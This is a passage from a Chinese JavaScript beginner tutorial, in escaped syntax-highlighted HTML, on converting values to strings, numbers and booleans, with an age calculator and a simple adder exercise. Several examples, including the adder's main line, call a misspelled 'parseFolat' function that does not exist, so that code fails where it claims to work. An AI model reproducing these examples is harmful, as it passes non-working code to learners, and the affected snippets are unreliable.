&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(String(&lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt;));
            &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 利用 + 拼接字符串的方法实现转换效果 隐式转换
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;);
        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;443-转换为数字型重点&#34;&gt;4.4.3 转换为数字型（重点）&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;方式&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;th&gt;案例&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;parseInt(string)&lt;/code&gt; 函数&lt;/td&gt;
&lt;td&gt;将string类型转成整数数值型&lt;/td&gt;
&lt;td&gt;&lt;code&gt;parseInt(&#39;78&#39;)&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;parseFloat(string)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;将string类型转成浮点数数值型&lt;/td&gt;
&lt;td&gt;&lt;code&gt;parseFolat(&#39;78.21&#39;)&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;Number()&lt;/code&gt; 强制转换函数&lt;/td&gt;
&lt;td&gt;将string类型转换为数值型&lt;/td&gt;
&lt;td&gt;&lt;code&gt;Number(&#39;12&#39;)&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;js 隐式转换&lt;code&gt;(- * /)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;利用算数运算隐士转换为数值型&lt;/td&gt;
&lt;td&gt;&lt;code&gt;&#39;12&#39; - 0&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;注意 parseInt 和 parseFloat 单词的大小写，这个是重点&lt;/li&gt;
&lt;li&gt;隐式转换是我们在进行算数运算的时候，JS 自动转换了数据类型&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;请输入你的年龄&amp;#39;&lt;/span&gt;);
            &lt;span style=&#34;color:#75715e&#34;&gt;// 1. parseInt(变量) 可以把 字符型的转换为数字型，得到的是整数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(parseInt(&lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;));
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(parseInt(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;3.14&amp;#39;&lt;/span&gt;));		 &lt;span style=&#34;color:#75715e&#34;&gt;// 3 取整
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(parseInt(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;3.94&amp;#39;&lt;/span&gt;));		 &lt;span style=&#34;color:#75715e&#34;&gt;// 3 取整
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(parseInt(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;120px&amp;#39;&lt;/span&gt;)); 	 &lt;span style=&#34;color:#75715e&#34;&gt;// 120 会去到这个px单位
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(parseInt(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rem120px&amp;#39;&lt;/span&gt;));   &lt;span style=&#34;color:#75715e&#34;&gt;// NaN
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 2. parseFolat(变量) 可以把 字符型的转换为数字型，得到是小数，浮点型
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;parseFolat&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;3.14&amp;#39;&lt;/span&gt;));     &lt;span style=&#34;color:#75715e&#34;&gt;// 3.14
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;parseFolat&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;120px&amp;#39;&lt;/span&gt;));    &lt;span style=&#34;color:#75715e&#34;&gt;// 120 会去到这个px单位
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;parseFolat&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rem120px&amp;#39;&lt;/span&gt;)); &lt;span style=&#34;color:#75715e&#34;&gt;// NaN
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 利用 Number(变量)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;123&amp;#39;&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(Number(&lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;));
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(Number(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;12&amp;#39;&lt;/span&gt;));
            &lt;span style=&#34;color:#75715e&#34;&gt;// 4. 利用了算数运算 - * / 隐式转换
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;12&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);			&lt;span style=&#34;color:#75715e&#34;&gt;// 12
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;123&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;120&amp;#39;&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// 3
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;123&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);			&lt;span style=&#34;color:#75715e&#34;&gt;// 123
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;案例1计算年龄&#34;&gt;案例1：计算年龄&lt;/h4&gt;
&lt;p&gt;此案例要求在页面弹出一个输入框，我们输入出生年份后，能计算出我们的年龄&lt;/p&gt;
&lt;p&gt;案例分析：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;弹出一个输入框（prompt），让用户输入出生年份（用户输入）&lt;/li&gt;
&lt;li&gt;把用户输入的值用变量保存起来，然后用今年的年份减去变量值，结果就是现在的年龄（程序内部处理）&lt;/li&gt;
&lt;li&gt;弹出警示框（alert），把计算的结果输出（输出结果）&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
            &lt;span style=&#34;color:#75715e&#34;&gt;// 弹出一个输入框（prompt），让用户输入出生年份（用户输入）
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 把用户输入的值用变量保存起来，然后用今年的年份减去变量值，结果就是现在的年龄（程序内部处理)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 弹出警示框（alert），把计算的结果输出（输出结果）
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;year&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;请您输入您的出生年份&amp;#39;&lt;/span&gt;);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2018&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;year&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// year 取过来的是字符串型，但是这里用的减法，有隐式转换
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;您今年已经&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;岁了&amp;#39;&lt;/span&gt;);
        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;案例2简单加法器&#34;&gt;案例2：简单加法器&lt;/h4&gt;
&lt;p&gt;计算两个数的值，用户输入第一个值后，继续弹出第二个输入框并输入第二个值，最后通过弹出窗口显示出两次输入值相加的结果。&lt;/p&gt;
&lt;p&gt;案例分析：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;先弹出一个输入框，提示用户输入第一个值，保存起来&lt;/li&gt;
&lt;li&gt;再弹出第二个框，提示用户输入第二个值，保存起来&lt;/li&gt;
&lt;li&gt;把这两个值相加，并将结果赋给新的变量（注意数据类型转换）&lt;/li&gt;
&lt;li&gt;弹出警示框（alert），把计算的结果输出（输出结果）&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
            &lt;span style=&#34;color:#75715e&#34;&gt;// 先弹出一个输入框，提示用户输入第一个值，保存起来
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 再弹出第二个框，提示用户输入第二个值，保存起来
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 把这两个值相加，并将结果赋给新的变量（注意数据类型转换）
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 弹出警示框（alert），把计算的结果输出（输出结果）
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;请您输入第一个值：&amp;#39;&lt;/span&gt;);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;请您输入第二个值：&amp;#39;&lt;/span&gt;);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;result&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parseFolat&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parseFolat&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt;);
            &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;您的结果是&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;result&lt;/span&gt;);
        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;444-转换为布尔型&#34;&gt;4.4.4 转换为布尔型&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;方式&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;th&gt;案例&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;Boolean()&lt;/code&gt; 函数&lt;/td&gt;
&lt;td&gt;其他类型转成布尔值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;Boolean(&#39;true&#39;);&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;代表空、否定的值会被转换为&lt;code&gt;false&lt;/code&gt;，如&lt;code&gt;&#39;&#39;&lt;/code&gt;、&lt;code&gt;NaN&lt;/code&gt;、&lt;code&gt;null&lt;/code&gt;、&lt;code&gt;undefined&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;其余值都会被转换为&lt;code&gt;true&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(Boolean(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;));			&lt;span style=&#34;color:#75715e&#34;&gt;// false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(Boolean(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));			&lt;span style=&#34;color:#75715e&#34;&gt;// false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(Boolean(&lt;span style=&#34;color:#66d9ef&#34;&gt;NaN&lt;/span&gt;));			&lt;span style=&#34;color:#75715e&#34;&gt;// false
